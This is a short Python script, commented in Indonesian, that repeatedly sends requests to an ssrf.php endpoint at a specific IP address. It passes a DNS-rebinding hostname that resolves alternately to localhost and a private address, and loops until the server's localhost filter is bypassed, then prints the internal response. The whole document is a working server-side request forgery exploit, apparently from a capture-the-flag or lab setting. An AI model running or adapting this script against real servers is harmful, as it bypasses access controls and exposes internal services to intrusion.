import requests

url = 'http://180.214.246.108:8080/ssrf.php?url=http://7f000001.c0a82b01.rbndr.us:8080'  # ganti dengan URL yang ingin diakses

while True:
    response = requests.get(url)
    
    if response.status_code == 200:
        if 'Access to localhost is not allowed' not in response.text:
            print(response.text)
            break  # keluar dari perulangan jika sudah mendapatkan string yang diinginkan
        else:
            print('Access to localhost is not allowed')
    else:
        print(f'Request failed with status code {response.status_code}')
